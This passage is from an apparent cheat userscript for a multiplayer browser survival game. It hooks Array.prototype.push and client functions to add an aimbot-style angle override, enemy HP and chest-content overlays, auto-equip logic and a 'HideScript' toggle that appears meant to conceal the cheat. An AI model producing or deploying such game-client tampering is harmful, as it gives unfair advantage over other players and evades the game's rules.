        }
      };
    }
    {
      let orignial_function = client.recycle_inv;
      client.recycle_inv = function (id) {
        orignial_function.call(this, id);
        LastRecycled = id;
      };
    }
    {
      const keys = Object.keys(client);
      let index;
      for (let i = 0; i < keys.length; i++) {
        const value = client[keys[i]];
        if (typeof value === "function" && value.toString().includes(".wait") && value.toString().includes("var") && value.toString().includes(".id")) {
          index = i;
          break;
        }
      }
      if (index) {
        const original_function = client[keys[index]];
        client[keys[index]] = function (...args) {
          let temp = -1;
          if (Settings.Equiq && user.inv.n[user.craft.preview] - 1) {
            temp = user.craft.preview;
          }
          original_function.apply(this, args);
          if (Settings.Equiq) {
            user.craft.preview = temp;
          }
        };
      } else {
        console.log("Failed to hook client.accept_build");
      }
    }
    {
      let drawKey = EncodeDict.draw;
      let draw_vehicleKey;
      let draw_fgKey;
      let updateKey = EncodeDict.update;
      let pidKey;
      let vehicleKey;
      let towerKey;
      let tower_fxKey;
      let vehicle_fx5Key;
      let flyKey;
      let nangleKey;
      let clotheKey;
      let speedKey;
      let dist_lavaKey;
      let dist_forestKey;
      let dist_winterKey;
      let playerKey;
      let ghostKey = EncodeDict.ghost;
      let original_function = Array.prototype.push;
      Array.prototype.push = function (_param_736) {
        let item = _param_736;
        if (typeof item === "object" && item && "type" in item && "id" in item && "x" in item && "y" in item) {
          if (!pidKey) {
            EncodeDict.pid = Object.keys(item)[1];
            ;
            pidKey = EncodeDict.pid;
          }
          item.pid = item[pidKey];
          if (item.pid === user.id && item.id > buildLimit) {
            buildLimit = item.id;
          }
          item.spawnTime = Date.now();
          switch (item.type) {
            case ITEMS.PLAYERS:
              item.maxHp = getHp(item.type);
              item.currentHp = item.maxHp;
              item.ally = user.id === item.pid || CheckAlly(item.pid);
              item.attackedRecentlyBy = {};
              if (!vehicleKey) {
                const keys = Object.keys(item);
                EncodeDict.vehicle = keys[keys.indexOf("right") + 1];
                vehicleKey = EncodeDict.vehicle;
              }
              Object.defineProperty(item, "vehicle", {
                get() {
                  return this[vehicleKey];
                },
                set(value) {
                  this[vehicleKey] = value;
                }
              });
              Object.defineProperty(item, "ghost", {
                get() {
                  return this[ghostKey];
                },
                set(value) {
                  return this[ghostKey] = value;
                }
              });
              if (item.ghost) {
                if (!item.spawnGhostTime || 60 - (performance.now() - item.spawnGhostTime) / 1000 < 0) {
                  item.spawnGhostTime = performance.now();
                }
              } else {
                item.spawnGhostTime = null;
              }
              if (!towerKey) {
                const keys = Object.keys(item);
                const arrayKeys = keys.filter(_param_737 => {
                  return Array.isArray(item[_param_737]);
                });
                const footKey = arrayKeys[0];
                const indexOfFootKey = keys.indexOf(footKey);
                towerKey = keys[indexOfFootKey + 1];
                EncodeDict.tower = towerKey;
              }
              Object.defineProperty(item, "tower", {
                get() {
                  return this[towerKey];
                }
              });
              if (!flyKey) {
                const keys = Object.keys(item);
                EncodeDict.fly = keys[keys.indexOf("freeze") - 12];
                flyKey = EncodeDict.fly;
              }
              Object.defineProperty(item, "fly", {
                get() {
                  return this[flyKey];
                }
              });
              if (!nangleKey) {
                const keys = Object.keys(item);
                EncodeDict.nangle = keys[keys.indexOf("action") - 1];
                nangleKey = EncodeDict.nangle;
              }
              Object.defineProperty(item, "nangle", {
                get() {
                  return this[nangleKey];
                },
                set(value) {
                  this[EncodeDict.nangle] = value;
                }
              });
              Object.defineProperty(item, "weapon", {
                get() {
                  if (SLOW_DOWN[this.right]) {
                    return true;
                  } else {
                    return false;
                  }
                }
              });
              if (!clotheKey) {
                const keys = Object.keys(item);
                EncodeDict.clothe = keys[keys.indexOf("bubbles") - 2];
                clotheKey = EncodeDict.clothe;
              }
              Object.defineProperty(item, "clothe", {
                get() {
                  return this[clotheKey];
                }
              });
              if (!speedKey) {
                const keys = Object.keys(item);
                EncodeDict.speed = keys[keys.indexOf("r") + 1];
                speedKey = EncodeDict.speed;
              }
              if (!tower_fxKey) {
                const keys = Object.keys(item);
                const vehicle_fx4Key = keys.find(_param_738 => {
                  return typeof item[_param_738] === "object" && "max" in item[_param_738] && "min" in item[_param_738];
                });
                tower_fxKey = keys[keys.indexOf(vehicle_fx4Key) + 2];
                EncodeDict.tower_fx = tower_fxKey;
              }
              Object.defineProperty(item, "tower_fx", {
                get() {
                  return this[tower_fxKey];
                }
              });
              if (!vehicle_fx5Key) {
                const keys = Object.keys(item);
                const vehicle_fx4Key = keys.find(key => {
                  return typeof item[key] === "object" && "max" in item[key] && "min" in item[key];
                });
                vehicle_fx5Key = keys[keys.indexOf(vehicle_fx4Key) + 1];
                EncodeDict.vehicle_fx5 = vehicle_fx5Key;
              }
              Object.defineProperty(item, "vehicle_fx5", {
                get() {
                  return this[vehicle_fx5Key];
                }
              });
              Object.defineProperty(item, "speed", {
                get() {
                  return this[speedKey];
                }
              });
              if (!playerKey) {
                playerKey = Object.keys(item).find(key => {
                  return typeof item[key] === "object" && item[key] && "label" in item[key] && "level" in item[key];
                });
              }
              Object.defineProperty(item, "player", {
                get() {
                  return this[playerKey];
                }
              });
              const privateX = Symbol("privateX");
              item.r[privateX] = item.r.x;
              item.r.oldX = item.r.x;
              Object.defineProperty(item.r, "x", {
                get() {
                  return this[privateX];
                },
                set(value) {
                  this.oldX = this.x;
                  this[privateX] = value;
                }
              });
              const privateY = Symbol("privateY");
              item.r[privateY] = item.r.y;
              item.r.oldY = item.r.y;
              Object.defineProperty(item.r, "y", {
                get() {
                  return this[privateY];
                },
                set(value) {
                  this.oldY = this.y;
                  this[privateY] = value;
                }
              });
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(_param_739 => {
                  return typeof item[_param_739] === "function";
                });
                EncodeDict.draw = drawKey;
              }
              if (item.pid !== user.id) {
                const orignial_draw_function = item[drawKey];
                item[drawKey] = function () {
                  orignial_draw_function.apply(this, arguments);
                  {
                    if (this.clothe === INV.HOOD && world.time || this.clothe === INV.WINTER_HOOD) {
                      let hoodCooldown;
                      if (this.clothe === INV.HOOD) {
                        hoodCooldown = 8000;
                      } else if (world.time === 1) {
                        hoodCooldown = 4000;
                      } else {
                        hoodCooldown = 8000;
                      }
                      const timeElapsed = performance.now() - (this.hitedTime > this.pullHoodTime ? this.hitedTime : this.pullHoodTime);
                      this.hoodTimerV = Math.min(timeElapsed / hoodCooldown, 1);
                    } else {
                      this.hoodTimerV = null;
                    }
                  }
                };
              } else {
                const orignial_draw_function = item[drawKey];
                item[drawKey] = function () {
                  orignial_draw_function.apply(this, arguments);
                  {
                    if (this.clothe === INV.HOOD && world.time || this.clothe === INV.WINTER_HOOD) {
                      let hoodCooldown;
                      if (this.clothe === INV.HOOD) {
                        hoodCooldown = 8000;
                      } else if (world.time === 1) {
                        hoodCooldown = 4000;
                      } else {
                        hoodCooldown = 8000;
                      }
                      const timeElapsed = performance.now() - (this.hitedTime > this.pullHoodTime ? this.hitedTime : this.pullHoodTime);
                      this.hoodTimerV = Math.min(timeElapsed / hoodCooldown, 1);
                    } else {
                      this.hoodTimerV = null;
                    }
                  }
                };
              }
              {
                const orignial_draw_function = item[drawKey];
                item[drawKey] = function (isInMyDraw) {
                  const draw_name = () => {
                    if (Settings.ShowHoodName.e && (this.clothe === INV.HOOD || this.clothe === INV.WINTER_HOOD) || Settings.GhostInfo.e && this.ghost) {
                      ctx.save();
                      ctx.translate(user.cam.x + this.x, user.cam.y + this.y);
                      let label_winter;
                      let lwW;
                      let lwH;
                      if (this.dist_winter > 0) {
                        if (!this.player.label_winter) {
                          this.player.label_winter = create_text(scale, this.player.nickname, 20, "#187484", "#000", 2, null, null, scale * 300);
                        }
                        label_winter = this.player.label_winter;
                      } else {
                        if (!this.player.label) {
                          this.player.label = create_text(scale, this.player.nickname, 20, "#FFF", "#000", 2, null, null, scale * 300);
                        }
                        label_winter = this.player.label;
                      }
                      lwW = Math.floor(-label_winter.width / 2);
                      lwH = Math.floor(-label_winter.height / 2 - scale * 70);
                      ctxDrawImage(ctx, label_winter, lwW, lwH);
                      let widthSum;
                      if (this.player.level > 0) {
                        widthSum = lwW + label_winter.width + 5;
                        if (PLAYER_LEVEL[this.player.level] === undefined) {
                          PLAYER_LEVEL[this.player.level] = create_text(scale, "[" + this.player.level + "]", 20, "#F9E8A2", "#000", 2, null, null, scale * 50);
                        }
                        ctxDrawImage(ctx, PLAYER_LEVEL[this.player.level], widthSum, lwH);
                      }
                      ctx.restore();
                    }
                  };
                  if (Settings.RenderOnTop.e && Settings.RenderOnTop.player && !Settings.HideScript.e) {
                    if (isInMyDraw) {
                      orignial_draw_function.apply(this);
                      draw_name();
                    }
                  } else {
                    orignial_draw_function.apply(this);
                    draw_name();
                  }
                };
              }
              Object.defineProperty(item, "draw", {
                get() {
                  return this[drawKey];
                }
              });
              if (!draw_vehicleKey) {
                const keys = Object.keys(item).filter(_param_740 => {
                  return typeof item[_param_740] === "function";
                });
                draw_vehicleKey = keys[1];
                EncodeDict.draw_vehicle = draw_vehicleKey;
              }
              {
                let orignial_draw_function = item[draw_vehicleKey];
                item[draw_vehicleKey] = function (isInMyDraw) {
                  if (Settings.RenderOnTop.e && Settings.RenderOnTop.player && !Settings.HideScript.e) {
                    if (isInMyDraw) {
                      ctx.save();
                      const originalDescriptor = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(ctx), "globalAlpha");
                      ctx.globalAlpha = Settings.VehicleOpacity;
                      Object.defineProperty(ctx, "globalAlpha", {
                        get() {
                          return Settings.VehicleOpacity;
                        },
                        set(value) {},
                        configurable: true
                      });
                      orignial_draw_function.apply(this);
                      Object.defineProperty(ctx, "globalAlpha", originalDescriptor);
                      ctx.restore();
                    }
                  } else {
                    orignial_draw_function.apply(this);
                  }
                };
              }
              Object.defineProperty(item, "draw_vehicle", {
                get() {
                  return this[draw_vehicleKey];
                }
              });
              {
                let filteredKeys;
                if (!dist_forestKey) {
                  filteredKeys = Object.keys(item).filter(_param_741 => {
                    return typeof item[_param_741] === "number" && item[_param_741] && item[_param_741] === -1000000;
                  });
                  dist_forestKey = filteredKeys[0];
                  dist_lavaKey = filteredKeys[2];
                  dist_winterKey = filteredKeys[3];
                  dist_waterKey = filteredKeys[5];
                }
                if (item.pid === user.id) {
                  const dist_waterSymbol = Symbol("dist_water");
                  item.dist_waterSymbol = item[dist_waterKey];
                  Object.defineProperty(item, dist_waterKey, {
                    get() {
                      return this[dist_waterSymbol];
                    },
                    set(newValue) {
                      const myPlayer = world.fast_units[user.uid];
                      if (myPlayer) {
                        if (Settings.AutoDiving.e && user.inv.n[INV.DIVING_MASK] && !myPlayer.vehicle && !IS_HELMET[myPlayer.clothe] && !isPullingDiving && !isPullingPilot) {
                          const oldValue = this[dist_waterSymbol];
                          if (newValue === 1 && oldValue === undefined) {
                            if (IncomingClothe !== null && IncomingClothe !== INV.DIVING_MASK || IncomingClothe === null && myPlayer.clothe !== INV.DIVING_MASK) {
                              if (IncomingClothe !== null) {
                                oldClothe = IncomingClothe;
                              } else {
                                oldClothe = myPlayer.clothe;
                              }
                              if (!user.craft.crafting) {
                                send_select_inv(INV.DIVING_MASK);
                                IncomingClothe = INV.DIVING_MASK;
                              } else if (clotheToUseWhenDoneCraft === null) {
                                clotheToUseWhenDoneCraft = INV.DIVING_MASK;
                                WaitForCraftingIsFalse().then(() => {
                                  if (IncomingClothe === null && myPlayer.clothe !== clotheToUseWhenDoneCraft || IncomingClothe !== null && IncomingClothe !== clotheToUseWhenDoneCraft) {
                                    send_select_inv(clotheToUseWhenDoneCraft);
                                    IncomingClothe = clotheToUseWhenDoneCraft;
                                  }
                                  clotheToUseWhenDoneCraft = null;
                                });
                              } else {
                                clotheToUseWhenDoneCraft = INV.DIVING_MASK;
                              }
                            }
                          } else if (newValue === undefined && oldValue === 1) {
                            if (oldClothe && oldClothe !== INV.DIVING_MASK) {
                              if (!user.craft.crafting) {
                                send_select_inv(oldClothe);
                                IncomingClothe = oldClothe;
                              } else if (clotheToUseWhenDoneCraft === null) {
                                clotheToUseWhenDoneCraft = oldClothe;
                                WaitForCraftingIsFalse().then(() => {
                                  if (IncomingClothe === null && myPlayer.clothe !== clotheToUseWhenDoneCraft || IncomingClothe !== null && IncomingClothe !== clotheToUseWhenDoneCraft) {
                                    send_select_inv(clotheToUseWhenDoneCraft);
                                    IncomingClothe = clotheToUseWhenDoneCraft;
                                  }
                                  clotheToUseWhenDoneCraft = null;
                                });
                              } else {
                                clotheToUseWhenDoneCraft = oldClothe;
                              }
                              oldClothe = null;
                            } else {
                              oldClothe = null;
                            }
                          }
                        }
                      }
                      this[dist_waterSymbol] = newValue;
                    }
                  });
                }
                Object.defineProperties(item, {
                  dist_forest: {
                    get() {
                      return this[dist_forestKey];
                    }
                  },
                  dist_lava: {
                    get() {
                      return this[dist_lavaKey];
                    }
                  },
                  dist_winter: {
                    get() {
                      return this[dist_winterKey];
                    }
                  },
                  dist_desert: {
                    get() {
                      return this[dist_desertKey];
                    }
                  },
                  dist_water: {
                    get() {
                      return this[dist_waterKey];
                    }
                  }
                });
              }
              item.pullHoodTime = performance.now() - (item.right === INV.WINTER_HOOD ? 8000 : 4000);
              item.hitedTime = item.pullHoodTime;
              {
                const original_function = item[updateKey];
                item[updateKey] = function (state) {
                  const oldGhost = this.ghost;
                  const oldRight = this.right;
                  const oldClothe = this.clothe;
                  original_function.apply(this, arguments);
                  if (this.right !== oldRight && IS_WEAPON[this.right]) {
                    this.pullWeaponTime = performance.now();
                  }
                  if (this.clothe !== oldClothe && (this.clothe === INV.HOOD || this.clothe === INV.WINTER_HOOD)) {
                    this.pullHoodTime = performance.now();
                  }
                  if (state & __p_ODkn_STATE_ATTACK) {
                    this.startAttackTime = performance.now();
                  } else if (state & __p_ODkn_STATE_COLD) {
                    if (this.dist_winter > 0) {
                      this.currentHp -= 40;
                    } else {
                      this.currentHp -= 20;
                    }
                  } else if (state & __p_ODkn_STATE_HEAL) {
                    this.currentHp += damageCalculator.calcHpPlayerWillGet(this);
                    this.currentHp = Math.min(200, this.currentHp);
                    healTimestamps[this.pid] = Date.now();
                  } else if (state & __p_ODkn_STATE_HUNGER) {
                    this.currentHp -= 40;
                  } else if (state & __p_ODkn_STATE_HURT) {
                    const attackingEntity = getEntityAttackingPlayer(this);
                    const calculatedDamage = damageCalculator.calcDamagePlayerWillGet(this, attackingEntity);
                    this.currentHp -= calculatedDamage;
                    this.hitedTime = performance.now();
                  }
                  if (this.ghost) {
                    if (60 - (performance.now() - this.spawnGhostTime) / 1000 < 0 || !this.spawnGhostTime) {
                      this.spawnGhostTime = performance.now();
                    }
                  } else {
                    this.spawnGhostTime = null;
                    if (oldGhost) {
                      this.currentHp = this.maxHp;
                    }
                  }
                  if (Settings.FakeEnemyAimbot.e) {
                    let range;
                    switch (HoldWeapon(this.right, true)) {
                      case 1:
                        range = this.fly ? 196.8 : 157.6;
                        break;
                      case 2:
                        range = this.fly ? 291.8 : 227.6;
                        break;
                      case 4:
                        range = this.fly ? 142 : 131;
                        break;
                    }
                    if (range) {
                      const myPlayer = world.fast_units[user.uid];
                      if (myPlayer) {
                        const dist = Utils.dist(myPlayer, this);
                        if (range >= dist) {
                          const myMoveDir = GetMoveDir(myPlayer);
                          let __p_lhlm_step_x = myMoveDir.x * (PingCounter / 1000) * myPlayer.speed;
                          let __p_lhlm_step_y = myMoveDir.y * (PingCounter / 1000) * myPlayer.speed;
                          const myPosBeforeAimbot = {
                            x: myPlayer.x - __p_lhlm_step_x,
                            y: myPlayer.y - __p_lhlm_step_y
                          };
                          const enemyMoveDir = GetMoveDir(this);
                          let __p_KTBT_step2_x = enemyMoveDir.x * (PingCounter / 1000) * this.speed;
                          let __p_KTBT_step2_y = enemyMoveDir.y * (PingCounter / 1000) * this.speed;
                          const enemyPosBeforeAimbot = {
                            x: this.x - __p_KTBT_step2_x,
                            y: this.y - __p_KTBT_step2_y
                          };
                          const angle = calcAngle(enemyPosBeforeAimbot, myPosBeforeAimbot, false);
                          this.nangle = angle;
                        }
                      }
                    }
                  }
                };
              }
              if (user.id === item.pid) {
                const original_function = item[updateKey];
                item[updateKey] = function (state) {
                  original_function.apply(this, arguments);
                  if (incomingRight === this.right) {
                    incomingRight = null;
                  }
                  if (IncomingClothe === this.clothe) {
                    IncomingClothe = null;
                  }
                };
              }
              break;
            case ITEMS.SPIKE:
              item.ally = user.id === item.pid || CheckAlly(item.pid);
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(_param_742 => {
                  return typeof item[_param_742] === "function";
                });
              }
              {
                let original_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  if (Settings.ColoredSpike.e && !Settings.HideScript.e) {
                    if (this.ally) {
                      return original_draw_function.call(this, 10000);
                    } else {
                      return original_draw_function.call(this, 10001);
                    }
                  } else {
                    original_draw_function.apply(this, args);
                  }
                };
              }
              break;
            case ITEMS.STONE_SPIKE:
              item.ally = user.id === item.pid || CheckAlly(item.pid);
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(key => {
                  return typeof item[key] === "function";
                });
              }
              {
                let original_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  if (Settings.ColoredSpike.e && !Settings.HideScript.e) {
                    if (this.ally) {
                      return original_draw_function.call(this, 10002);
                    } else {
                      return original_draw_function.call(this, 10003);
                    }
                  } else {
                    original_draw_function.apply(this, args);
                  }
                };
              }
              break;
            case ITEMS.GOLD_SPIKE:
              item.ally = user.id === item.pid || CheckAlly(item.pid);
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(_param_743 => {
                  return typeof item[_param_743] === "function";
                });
              }
              {
                let original_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  if (Settings.ColoredSpike.e && !Settings.HideScript.e) {
                    if (this.ally) {
                      return original_draw_function.call(this, 10004);
                    } else {
                      return original_draw_function.call(this, 10005);
                    }
                  } else {
                    original_draw_function.apply(this, args);
                  }
                };
              }
              break;
            case ITEMS.DIAMOND_SPIKE:
              item.ally = user.id === item.pid || CheckAlly(item.pid);
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(key => {
                  return typeof item[key] === "function";
                });
                console.log(drawKey);
              }
              {
                let original_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  if (Settings.ColoredSpike.e && !Settings.HideScript.e) {
                    if (this.ally) {
                      return original_draw_function.call(this, 10006);
                    } else {
                      return original_draw_function.call(this, 10007);
                    }
                  } else {
                    original_draw_function.apply(this, args);
                  }
                };
              }
              break;
            case ITEMS.AMETHYST_SPIKE:
              item.ally = user.id === item.pid || CheckAlly(item.pid);
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(_param_744 => {
                  return typeof item[_param_744] === "function";
                });
                console.log(drawKey);
              }
              {
                let original_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  if (Settings.ColoredSpike.e && !Settings.HideScript.e) {
                    if (this.ally) {
                      return original_draw_function.call(this, 10008);
                    } else {
                      return original_draw_function.call(this, 10009);
                    }
                  } else {
                    original_draw_function.apply(this, args);
                  }
                };
              }
              break;
            case ITEMS.REIDITE_SPIKE:
              item.ally = user.id === item.pid || CheckAlly(item.pid);
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(_param_745 => {
                  return typeof item[_param_745] === "function";
                });
              }
              {
                let original_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  if (Settings.ColoredSpike.e && !Settings.HideScript.e) {
                    if (this.ally) {
                      return original_draw_function.call(this, 10010);
                    } else {
                      return original_draw_function.call(this, 10011);
                    }
                  } else {
                    original_draw_function.apply(this, args);
                  }
                };
              }
              break;
            case ITEMS.REIDITE_DOOR_SPIKE:
              item.ally = user.id === item.pid || CheckAlly(item.pid);
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(key => {
                  return typeof item[key] === "function";
                });
              }
              {
                let original_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  if (Settings.ColoredSpike.e && !(item.info & 1) && !Settings.HideScript.e) {
                    if (this.ally) {
                      return original_draw_function.call(this, 10012);
                    } else {
                      return original_draw_function.call(this, 10013);
                    }
                  } else {
                    original_draw_function.apply(this, args);
                  }
                };
              }
              break;
            case ITEMS.AMETHYST_DOOR_SPIKE:
              item.ally = user.id === item.pid || CheckAlly(item.pid);
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(_param_746 => {
                  return typeof item[_param_746] === "function";
                });
              }
              {
                let original_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  if (Settings.ColoredSpike.e && !(item.info & 1) && !Settings.HideScript.e) {
                    if (this.ally) {
                      return original_draw_function.call(this, 10014);
                    } else {
                      return original_draw_function.call(this, 10015);
                    }
                  } else {
                    original_draw_function.apply(this, args);
                  }
                };
              }
              break;
            case ITEMS.DIAMOND_DOOR_SPIKE:
              item.ally = user.id === item.pid || CheckAlly(item.pid);
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(_param_747 => {
                  return typeof item[_param_747] === "function";
                });
              }
              {
                let original_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  if (Settings.ColoredSpike.e && !(item.info & 1) && !Settings.HideScript.e) {
                    if (this.ally) {
                      return original_draw_function.call(this, 10016);
                    } else {
                      return original_draw_function.call(this, 10017);
                    }
                  } else {
                    original_draw_function.apply(this, args);
                  }
                };
              }
              break;
            case ITEMS.GOLD_DOOR_SPIKE:
              item.ally = user.id === item.pid || CheckAlly(item.pid);
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(_param_748 => {
                  return typeof item[_param_748] === "function";
                });
              }
              {
                let original_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  if (Settings.ColoredSpike.e && !(item.info & 1) && !Settings.HideScript.e) {
                    if (this.ally) {
                      return original_draw_function.call(this, 10018);
                    } else {
                      return original_draw_function.call(this, 10019);
                    }
                  } else {
                    original_draw_function.apply(this, args);
                  }
                };
              }
              break;
            case ITEMS.STONE_DOOR_SPIKE:
              item.ally = user.id === item.pid || CheckAlly(item.pid);
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(_param_749 => {
                  return typeof item[_param_749] === "function";
                });
              }
              {
                let original_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  if (Settings.ColoredSpike.e && !(item.info & 1) && !Settings.HideScript.e) {
                    if (this.ally) {
                      return original_draw_function.call(this, 10020);
                    } else {
                      return original_draw_function.call(this, 10021);
                    }
                  } else {
                    original_draw_function.apply(this, args);
                  }
                };
              }
              break;
            case ITEMS.WOOD_DOOR_SPIKE:
              item.ally = user.id === item.pid || CheckAlly(item.pid);
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(_param_750 => {
                  return typeof item[_param_750] === "function";
                });
              }
              {
                let original_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  if (Settings.ColoredSpike.e && !(item.info & 1) && !Settings.HideScript.e) {
                    if (this.ally) {
                      return original_draw_function.call(this, 10022);
                    } else {
                      return original_draw_function.call(this, 10023);
                    }
                  } else {
                    original_draw_function.apply(this, args);
                  }
                };
              }
              break;
            case ITEMS.REIDITE_DOOR:
              item.ally = user.id === item.pid || CheckAlly(item.pid);
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(key => {
                  return typeof item[key] === "function";
                });
              }
              {
                let original_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  if (Settings.ColoredSpike.e && !(item.info & 1) && !Settings.HideScript.e) {
                    if (this.ally) {
                      return original_draw_function.call(this, 10024);
                    } else {
                      return original_draw_function.call(this, 10025);
                    }
                  } else {
                    original_draw_function.apply(this, args);
                  }
                };
              }
              break;
            case ITEMS.AMETHYST_DOOR:
              item.ally = user.id === item.pid || CheckAlly(item.pid);
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(key => {
                  return typeof item[key] === "function";
                });
              }
              {
                let original_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  if (Settings.ColoredSpike.e && !(item.info & 1) && !Settings.HideScript.e) {
                    if (this.ally) {
                      return original_draw_function.call(this, 10026);
                    } else {
                      return original_draw_function.call(this, 10027);
                    }
                  } else {
                    original_draw_function.apply(this, args);
                  }
                };
              }
              break;
            case ITEMS.DIAMOND_DOOR:
              item.ally = user.id === item.pid || CheckAlly(item.pid);
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(key => {
                  return typeof item[key] === "function";
                });
              }
              {
                let original_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  if (Settings.ColoredSpike.e && !(item.info & 1) && !Settings.HideScript.e) {
                    if (this.ally) {
                      return original_draw_function.call(this, 10028);
                    } else {
                      return original_draw_function.call(this, 10029);
                    }
                  } else {
                    original_draw_function.apply(this, args);
                  }
                };
              }
              break;
            case ITEMS.GOLD_DOOR:
              item.ally = user.id === item.pid || CheckAlly(item.pid);
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(_param_751 => {
                  return typeof item[_param_751] === "function";
                });
              }
              {
                let original_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  if (Settings.ColoredSpike.e && !(item.info & 1) && !Settings.HideScript.e) {
                    if (this.ally) {
                      return original_draw_function.call(this, 10030);
                    } else {
                      return original_draw_function.call(this, 10031);
                    }
                  } else {
                    original_draw_function.apply(this, args);
                  }
                };
              }
              break;
            case ITEMS.STONE_DOOR:
              item.ally = user.id === item.pid || CheckAlly(item.pid);
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(key => {
                  return typeof item[key] === "function";
                });
              }
              {
                let original_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  if (Settings.ColoredSpike.e && !(item.info & 1) && !Settings.HideScript.e) {
                    if (this.ally) {
                      return original_draw_function.call(this, 10032);
                    } else {
                      return original_draw_function.call(this, 10033);
                    }
                  } else {
                    original_draw_function.apply(this, args);
                  }
                };
              }
              break;
            case ITEMS.WOOD_DOOR:
              item.ally = user.id === item.pid || CheckAlly(item.pid);
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(key => {
                  return typeof item[key] === "function";
                });
              }
              {
                let original_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  if (Settings.ColoredSpike.e && !(item.info & 1) && !Settings.HideScript.e) {
                    if (this.ally) {
                      return original_draw_function.call(this, 10034);
                    } else {
                      return original_draw_function.call(this, 10035);
                    }
                  } else {
                    original_draw_function.apply(this, args);
                  }
                };
              }
              break;
            case ITEMS.ROOF:
              item.j = Math.floor(item.x / 100);
              item.i = Math.floor(item.y / 100);
              {
                const original_draw_function = item[drawKey];
                item[drawKey] = function () {
                  if (!Settings.HideScript.e && Settings.Roof.e) {
                    draw_roof.apply(this, arguments);
                  } else {
                    original_draw_function.apply(this, arguments);
                  }
                };
              }
              break;
            case ITEMS.CHEST:
              item.ally = user.id === item.pid || CheckAlly(item.pid);
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(key => {
                  return typeof item[key] === "function" && item[key].toString().replace(/\s+/g, "").includes(".save()");
                });
              }
              {
                let original_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  if (Settings.ChestInfo.e && !Settings.HideScript.e) {
                    ctx.save();
                    ctx.translate(user.cam.x + this.x, user.cam.y + this.y);
                    ctx.rotate(this.angle);
                    let img;
                    if (this.lock) {
                      if (this.ally) {
                        img = sprite[10101][world.time];
                      } else {
                        img = sprite[10102][world.time];
                      }
                    } else {
                      img = sprite[10100][world.time];
                    }
                    let w = -img.width;
                    let h = -img.height;
                    ctxDrawImage(ctx, img, -w / 2, -h / 2, w, h);
                    ctx.restore();
                    if (this.action) {
                      ctx.save();
                      ctx.globalAlpha = 0.9;
                      let imgInv = game.chest_buttons[this.action / 2 - 1].info.img[0];
                      ctxDrawImage(ctx, imgInv, user.cam.x + this.x + 27, user.cam.y + this.y + 28, w + 25, w + 25);
                      ctx.globalAlpha = 1;
                      ctx.font = "20px Baloo Paaji";
                      ctx.strokeStyle = "black";
                      ctx.fillStyle = "white";
                      ctx.lineWidth = 6;
                      ctx.strokeText("x" + this.info, user.cam.x + this.x - 32, user.cam.y + this.y + 20);
                      ctx.fillText("x" + this.info, user.cam.x + this.x - 32, user.cam.y + this.y + 20);
                      if (Settings.ChestInfo.isShowInvId) {
                        ctx.strokeText(this.action / 2 - 1, user.cam.x + this.x - 32, user.cam.y + this.y - 12);
                        ctx.fillText(this.action / 2 - 1, user.cam.x + this.x - 32, user.cam.y + this.y - 12);
                      }
                      ctx.restore();
                    }
                  } else {
                    original_draw_function.apply(this, args);
                  }
                };
              }
              break;
            case ITEMS.FURNACE:
              let orignial_draw_function = item[drawKey];
              {
                item[drawKey] = function (...args) {
                  orignial_draw_function.apply(this, args);
                  if (this.info && Settings.WorldInfo.e && !Settings.HideScript.e) {
                    ctx.save();
                    ctx.font = "22px Baloo Paaji";
                    ctx.strokeStyle = "black";
                    ctx.lineWidth = 7;
                    ctx.strokeText("x" + this.info, user.cam.x + this.x - 15, user.cam.y + this.y);
                    ctx.fillStyle = "white";
                    ctx.fillText("x" + this.info, user.cam.x + this.x - 15, user.cam.y + this.y);
                    ctx.restore();
                  }
                };
              }
              break;
            case ITEMS.EMERALD_MACHINE:
              item.img = new createText(200, 50, 0);
              item.img.drawText(String.raw`${world.players[item.pid].nickname}`, 18, "black", "white");
              {
                if (!draw_fgKey) {
                  draw_fgKey = Object.keys(item).filter(key => {
